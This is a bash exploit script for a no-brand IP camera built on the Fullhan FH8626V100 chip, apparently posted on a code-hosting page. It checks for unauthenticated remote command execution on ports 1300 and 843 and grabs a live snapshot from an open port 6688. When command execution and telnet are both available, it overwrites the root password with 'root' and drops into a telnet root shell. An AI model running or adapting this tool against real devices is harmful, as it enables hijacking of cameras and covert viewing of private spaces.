#Created by Brian Thanushikan
if [ "$1" != "check" ] && [ "$1" != "show" ] && [ "$1" != "notes" ]; then
	echo "USAGE [vuln.sh OPTION IP]"
	echo "To check for vulnerabilities    : vuln.sh check IP";
	echo "To see the image of the camera  : vuln.sh show";
fi

#global variables for vulnerability
rce_1300="n";
rce_843="n";
telnet_23_a="n";
livestream_6688="n";

if [ "$1" = "check" ]; then
	#This is a vulnerability I found researching a no brand chinese ip camera (Fullhan FH8626V100)
	echo "[.]Checking RCE in port 1300";

	rce_out=$(echo "<SYSTEM>ls</SYSTEM>" | nc $2 1300);

	if [ "$rce_out" = "<SYSTEM_ACK>ok</SYSTEM_ACK>" ]; then
		echo "[+]Vulnerability Found";
		echo "[+]RCE is available on port 1300";
		rce_1300="y";
	else
		echo "[-]Port 1300 isn't vulnerable to RCE";
	fi


	#This is a vulnerability I found researching a no brand ip camera (Fullhan FH8626V100)
	echo "[.]Checking RCE in port 843";
	
	rce_out=$(echo "<SYSTEM>ls</SYSTEM>" | nc $2 843);

	if [ "$rce_out" = "<SYSTEM_ACK>ok</SYSTEM_ACK>" ]; then
		echo "[+]vulnerability Found";
		echo "[+]RCE is available on port 843";
		rce_843="y";
	else
		echo "[-]Port 843 isn't vulnerable to RCE";
	fi


	
	echo "[.]Checking telnet access";

	telnet_23=$(nmap -Pn $2 -p 23 | awk 'NR == 6{print $2}')

	if [ "$telnet_23" = "open" ]; then
		echo "[+]Telnet is available on port 23";
		telnet_23_a="y";
	else
		echo "[-]Telnet is not available on port 23";
	fi
	
	#While researching I found port 6688 open on fullhan fh8626v100 which gives a live image unauthenticated
	echo "[.]Trying to get a live image";
	
	wget "http://$2:6688/snapshot.jpg" 1>/dev/null 2>/dev/null;

	if [ -f snapshot.jpg ]; then
		echo "[+]Vulnerability Found";
		echo "[+]Saved snapshot.jpg in current Directory";

		echo -n  "[?]Do you want to see the image[y/n]: ";
		read confirmation;

		if [ "$confirmation" = "y" ]; then
			ristretto snapshot.jpg;
		fi
		livestream_6688="y";

		echo -n  "[?]Do you want to save the image[y/n]: ";
		read confirmation;

		if [ "$confirmation" != "y" ]; then
			rm snapshot.jpg;
		fi
	else
		echo "[-]Getting live image failed";
	fi

	if [ "$rce_1300" = "y" ] && [ "$telnet_23_a" = "y" ]; then
		echo -n  "[?]Do you want to get a shell[y/n]: ";
		read confirmation;

		if [ "$confirmation" = "y" ]; then
			echo "[+]Changing root hash";
			response=$(echo "<SYSTEM>echo \"root:root\" | chpasswd</SYSTEM>" | nc $2 1300);
			echo "[+]Response: $response";
			if [ "$response" = "<SYSTEM_ACK>ok</SYSTEM_ACK>" ]; then
				echo "[+]Log in via this LOGIN:root PASSWD:root";
				echo "[+]HELL YEAH!";
				echo "";
				echo "";
				telnet $2;
			fi
		fi
	fi

fi

if [ "$1" = "show" ]; then
	ristretto pic.jpg;
fi

exploit.sh
Displaying exploit.sh.
